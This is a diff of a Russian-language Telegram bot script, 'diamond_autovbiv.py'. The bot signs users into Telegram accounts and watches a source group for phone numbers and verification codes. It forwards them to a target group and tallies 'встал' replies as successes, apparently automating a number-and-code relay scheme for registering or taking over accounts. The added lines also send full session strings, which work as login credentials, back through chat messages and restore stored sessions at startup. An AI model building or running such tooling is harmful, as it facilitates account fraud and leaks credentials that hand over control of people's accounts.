@@ -1,5 +1,5 @@
 # diamond_autovbiv.py
-# FIXED ALL BUGS + DEBUG LOGS
+# FINAL WORKING VERSION
 
 import os
 import asyncio
@@ -11,7 +11,7 @@ from telethon import TelegramClient, events
 from telethon.errors import SessionPasswordNeededError, PhoneCodeInvalidError, FloodWaitError
 from telethon.tl.custom import Button
 
-# ========== КОНФИГ ==========
+# ========== КОНФИГ ДЛЯ RAILWAY ==========
 API_ID = int(os.environ.get("API_ID", 0))
 API_HASH = os.environ.get("API_HASH", "")
 BOT_TOKEN = os.environ.get("BOT_TOKEN", "")
@@ -24,7 +24,7 @@ BACKUP_DIR = "/app/backups"
 os.makedirs(BACKUP_DIR, exist_ok=True)
 
 if not API_ID or not API_HASH or not BOT_TOKEN:
-    print("❌ Ошибка: Установите переменные в Railway")
+    print("❌ Ошибка: Установите переменные в Railway: API_ID, API_HASH, BOT_TOKEN")
     exit(1)
 
 # ========== БАЗА ДАННЫХ ==========
@@ -73,11 +73,19 @@ class DiamondDB:
         self.conn.commit()
     
     def save_session(self, user_id, phone, session_string, step):
+        print(f"[DB] Сохранение сессии: user={user_id}, phone={phone}, step={step}, session_len={len(session_string) if session_string else 0}")
         self.cursor.execute('''
             INSERT OR REPLACE INTO sessions (user_id, phone, session_string, step, created_at)
             VALUES (?, ?, ?, ?, ?)
         ''', (user_id, phone, session_string, step, datetime.now()))
         self.conn.commit()
+        # Проверка
+        self.cursor.execute('SELECT session_string FROM sessions WHERE user_id = ?', (user_id,))
+        row = self.cursor.fetchone()
+        if row and row[0]:
+            print(f"[DB] Сессия успешно сохранена, длина {len(row[0])}")
+        else:
+            print(f"[DB] ОШИБКА: сессия не сохранилась!")
     
     def get_session(self, user_id):
         self.cursor.execute('SELECT session_string, phone, step FROM sessions WHERE user_id = ?', (user_id,))
@@ -86,7 +94,9 @@ class DiamondDB:
     
     def is_authorized(self, user_id):
         session_string, _, _ = self.get_session(user_id)
-        return bool(session_string)
+        authorized = bool(session_string and session_string.strip())
+        print(f"[DB] is_authorized({user_id}) = {authorized}")
+        return authorized
     
     def set_groups(self, user_id, source_group, target_group):
         self.cursor.execute('''
@@ -173,7 +183,7 @@ def get_code_keyboard():
         [Button.inline("0", b"0"), Button.inline("⌫", b"del"), Button.inline("✅", b"submit")]
     ]
 
-# ========== ФУНКЦИИ ==========
+# ========== ФУНКЦИИ ДЛЯ НОМЕРОВ ==========
 def clean_phone(phone):
     cleaned = re.sub(r'[^\d+]', '', phone)
     cleaned = re.sub(r'^\+{2,}', '+', cleaned)
@@ -280,7 +290,7 @@ async def setup_handlers():
             session_string = client.session.save()
             phone = (await client.get_me()).phone
             db.save_session(user_id, phone, session_string, "authorized")
-            await event.reply(f"✅ Вход выполнен!\nАккаунт: {phone}")
+            await event.reply(f"✅ Вход выполнен!\nАккаунт: {phone}\n\n🔑 Session string:\n`{session_string}`")
         except Exception as e:
             await event.reply(f"❌ Ошибка: {str(e)}")
     
@@ -308,14 +318,28 @@ async def setup_handlers():
             if not code:
                 await event.answer("Введите код!", alert=True)
                 return
-            await event.answer("Проверяю...")
+            await event.answer("⏳ Проверяю...")
             client = user_clients.get(user_id)
             try:
                 await client.sign_in(code=code)
                 session_string = client.session.save()
+                print(f"[LOG] Получена session_string длиной {len(session_string)}")
                 user_phone = (await client.get_me()).phone
                 db.save_session(user_id, user_phone, session_string, "authorized")
-                await event.edit(f"✅ Вход выполнен!\nАккаунт: {user_phone}")
+                # Дублируем проверку
+                if db.is_authorized(user_id):
+                    await event.edit(
+                        f"✅ **Вход выполнен!**\n\n📱 Аккаунт: `{user_phone}`\n\n"
+                        f"🔑 **Session string (сохраните):**\n`{session_string}`\n\n"
+                        f"Теперь /set_source и /set_target"
+                    )
+                    # Отправляем отдельно для копирования
+                    await bot.send_message(
+                        user_id,
+                        f"🔐 **Session string для {user_phone}:**\n\n`{session_string}`\n\nСохраните!"
+                    )
+                else:
+                    await event.edit(f"⚠️ Вход выполнен, но сессия НЕ СОХРАНИЛАСЬ!\n\nАккаунт: {user_phone}\n\nSession string (вставьте вручную):\n`{session_string}`")
                 del user_code_inputs[user_id]
             except PhoneCodeInvalidError:
                 user_code_inputs[user_id]['attempts'] += 1
@@ -333,39 +357,37 @@ async def setup_handlers():
                 await event.edit(f"❌ {str(e)}")
                 del user_code_inputs[user_id]
     
-    # ===== КОМАНДЫ ДЛЯ ГРУПП (с отладочными ответами) =====
     @bot.on(events.NewMessage(pattern='(?i)/set_source'))
     async def set_source_cmd(event):
-        print(f"[LOG] Команда /set_source получена от {event.sender_id} в чате {event.chat_id}")
+        print(f"[LOG] /set_source от {event.sender_id} в чате {event.chat_id}")
         user_id = event.sender_id
         if event.is_group:
             source_group = event.chat_id
             _, target_group = db.get_groups(user_id)
             db.set_groups(user_id, source_group, target_group)
-            await event.reply(f"✅ **ГРУППА-ИСТОЧНИК установлена!**\nID: {source_group}\nБот будет следить за номерами и кодами здесь.")
-            print(f"[LOG] Пользователь {user_id} установил источник {source_group}")
+            await event.reply(f"✅ **ГРУППА-ИСТОЧНИК установлена!**\nБот будет следить за номерами и кодами здесь.")
+            print(f"[LOG] Источник {source_group} для пользователя {user_id}")
         else:
-            await event.reply("❌ Эта команда работает только в ГРУППЕ. Напишите её в группе, которую хотите сделать источником.")
+            await event.reply("❌ Команда работает только в группе.")
     
     @bot.on(events.NewMessage(pattern='(?i)/set_target'))
     async def set_target_cmd(event):
-        print(f"[LOG] Команда /set_target получена от {event.sender_id} в чате {event.chat_id}")
+        print(f"[LOG] /set_target от {event.sender_id} в чате {event.chat_id}")
         user_id = event.sender_id
         if event.is_group:
             target_group = event.chat_id
             source_group, _ = db.get_groups(user_id)
             db.set_groups(user_id, source_group, target_group)
-            await event.reply(f"✅ **ГРУППА-ЦЕЛЬ установлена!**\nID: {target_group}\nСюда будут приходить номера и коды, здесь жду слово 'встал'.")
-            print(f"[LOG] Пользователь {user_id} установил цель {target_group}")
-            # Если источник уже установлен, запускаем слушателя
-            if source_group:
+            await event.reply(f"✅ **ГРУППА-ЦЕЛЬ установлена!**\nСюда будут приходить номера и коды, здесь жду 'встал'.")
+            print(f"[LOG] Цель {target_group} для пользователя {user_id}")
+            if source_group and db.is_authorized(user_id):
                 session_string, _, _ = db.get_session(user_id)
                 if session_string:
                     client = await get_user_client(user_id, session_string)
                     if client:
                         asyncio.create_task(start_source_listener(user_id, client, source_group))
         else:
-            await event.reply("❌ Эта команда работает только в ГРУППЕ. Напишите её в группе, которую хотите сделать целью.")
+            await event.reply("❌ Команда работает только в группе.")
     
     @bot.on(events.NewMessage(pattern='/stats'))
     async def stats_cmd(event):
@@ -377,23 +399,24 @@ async def setup_handlers():
     @bot.on(events.NewMessage(pattern='/status'))
     async def status_cmd(event):
         user_id = event.sender_id
-        session_string, phone, _ = db.get_session(user_id)
+        session_string, phone, step = db.get_session(user_id)
         source, target = db.get_groups(user_id)
-        auth = "✅ авторизован" if session_string else "❌ не авторизован"
-        msg = f"⚙️ СТАТУС\n\n👤 Аккаунт: {phone or '❌'}\n🔐 Статус: {auth}\n📥 Источник: {source or '❌'}\n📤 Цель: {target or '❌'}"
+        auth = "✅" if db.is_authorized(user_id) else "❌"
+        has_sess = "есть" if session_string else "нет"
+        msg = f"⚙️ СТАТУС\n\n👤 Аккаунт: {phone or '❌'}\n🔐 Авторизован: {auth}\n📦 Сессия в БД: {has_sess}\n📥 Источник: {source or '❌'}\n📤 Цель: {target or '❌'}"
         await event.reply(msg)
     
     @bot.on(events.NewMessage(pattern='/export'))
     async def export_cmd(event):
         user_id = event.sender_id
-        print(f"[LOG] /export от пользователя {user_id}")
+        print(f"[LOG] /export от {user_id}")
         if not db.is_authorized(user_id):
-            await event.reply("❌ Сначала выполните вход: /login +79991234567")
+            await event.reply("❌ Сначала /login")
             return
         backup_path = db.export_db(user_id)
         await event.reply("📦 Выгрузка БД...")
         await bot.send_file(event.chat_id, backup_path, caption="💎 diamond_data.db")
-        print(f"[LOG] БД выгружена для {user_id}")
+        print(f"[LOG] БД выгружена {user_id}")
     
     @bot.on(events.NewMessage(pattern='/reset'))
     async def reset_cmd(event):
@@ -408,71 +431,90 @@ async def setup_handlers():
     
     # ========== ОСНОВНАЯ ЛОГИКА ПЕРЕХВАТА ==========
     async def start_source_listener(user_id, client, source_group_id):
-        print(f"[LOG] Запущен слушатель для {user_id} в группе {source_group_id}")
+        print(f"[LOG] Слушатель запущен для {user_id} в группе {source_group_id}")
         @client.on(events.NewMessage(chats=source_group_id))
         async def handle_source(event):
             try:
                 if event.sender_id == (await client.get_me()).id:
                     return
                 text = event.raw_text.strip()
-                print(f"[LOG] Сообщение в источнике: {text[:100]}")
+                print(f"[SOURCE] {text[:100]}")
                 phone = extract_phone_from_text(text)
                 if phone:
-                    print(f"[LOG] Найден номер: {phone}")
+                    print(f"[SOURCE] Номер: {phone}")
                     db.add_pending_number(user_id, phone)
                     db.add_stat(user_id, phone, 'number_taken')
-                    _, target_group = db.get_groups(user_id)
-                    if target_group:
-                        await client.send_message(target_group, f"📱 НОМЕР: `{phone}`")
-                        print(f"[LOG] Номер {phone} отправлен в цель")
+                    _, target = db.get_groups(user_id)
+                    if target:
+                        await client.send_message(target, f"📱 НОМЕР: `{phone}`")
                     return
                 code = extract_code_from_text(text)
                 if code:
-                    print(f"[LOG] Найден код: {code}")
-                    last_phone = db.get_last_pending_number(user_id)
-                    if last_phone:
-                        db.update_pending_with_code(last_phone, code)
-                        db.add_stat(user_id, last_phone, 'code_taken')
-                        _, target_group = db.get_groups(user_id)
-                        if target_group:
-                            await client.send_message(target_group, f"🔢 КОД: `{code}`\nДля номера: `{last_phone}`")
-                            print(f"[LOG] Код {code} для {last_phone} отправлен в цель")
+                    print(f"[SOURCE] Код: {code}")
+                    last = db.get_last_pending_number(user_id)
+                    if last:
+                        db.update_pending_with_code(last, code)
+                        db.add_stat(user_id, last, 'code_taken')
+                        _, target = db.get_groups(user_id)
+                        if target:
+                            await client.send_message(target, f"🔢 КОД: `{code}`\nДля номера: `{last}`")
             except Exception as e:
-                print(f"[LOG] Ошибка в слушателе: {e}")
+                print(f"[SOURCE ERROR] {e}")
     
     @bot.on(events.NewMessage())
     async def handle_target(event):
         try:
             user_id = event.sender_id
-            _, target_group = db.get_groups(user_id)
-            if not target_group or event.chat_id != target_group:
+            _, target = db.get_groups(user_id)
+            if not target or event.chat_id != target:
                 return
             text = event.raw_text.lower()
-            print(f"[LOG] Сообщение в целевой группе: {text[:100]}")
+            print(f"[TARGET] {text[:100]}")
             if 'встал' in text or 'успех' in text:
                 phone = extract_phone_from_text(text)
                 if phone:
                     db.mark_success(phone)
                     db.add_stat(user_id, phone, 'success')
                     await event.reply(f"✅ {phone} — ВСТАЛ!")
-                    print(f"[LOG] Успех для {phone}")
                 else:
                     last = db.get_last_pending_number(user_id)
                     if last:
                         db.mark_success(last)
                         db.add_stat(user_id, last, 'success')
                         await event.reply(f"✅ {last} — ВСТАЛ!")
-                        print(f"[LOG] Успех для последнего номера {last}")
         except Exception as e:
-            print(f"[LOG] Ошибка в обработчике цели: {e}")
+            print(f"[TARGET ERROR] {e}")
+
+# ========== ВОССТАНОВЛЕНИЕ СЕССИЙ ПРИ СТАРТЕ ==========
+async def restore_sessions():
+    print("[LOG] Восстановление сессий из БД...")
+    db.cursor.execute('SELECT user_id, session_string FROM sessions WHERE session_string IS NOT NULL AND session_string != ""')
+    rows = db.cursor.fetchall()
+    for user_id, sess_str in rows:
+        print(f"[LOG] Восстанавливаю сессию для {user_id}")
+        try:
+            client = TelegramClient(os.path.join(SESSION_DIR, f"user_{user_id}"), API_ID, API_HASH)
+            await client.connect()
+            client.session.set_session_str(sess_str)
+            if await client.is_user_authorized():
+                user_clients[user_id] = client
+                print(f"[LOG] Сессия {user_id} восстановлена")
+                source, _ = db.get_groups(user_id)
+                if source:
+                    asyncio.create_task(start_source_listener(user_id, client, source))
+            else:
+                print(f"[LOG] Сессия {user_id} невалидна, потребуется /login")
+        except Exception as e:
+            print(f"[LOG] Ошибка восстановления {user_id}: {e}")
 
 # ========== ЗАПУСК ==========
 async def main():
     global bot
-    print("💎 DIAMOND AUTOVBIV BOT v3.1 (DEBUG)")
+    print("💎 DIAMOND AUTOVBIV BOT v4.0 FINAL")
     print(f"📡 API_ID: {API_ID}")
     bot = TelegramClient(os.path.join(SESSION_DIR, "main_bot"), API_ID, API_HASH)
     await bot.start(bot_token=BOT_TOKEN)
+    await restore_sessions()
     await setup_handlers()
     print("✅ Бот запущен. Логи включены.")
     await bot.run_until_disconnected()
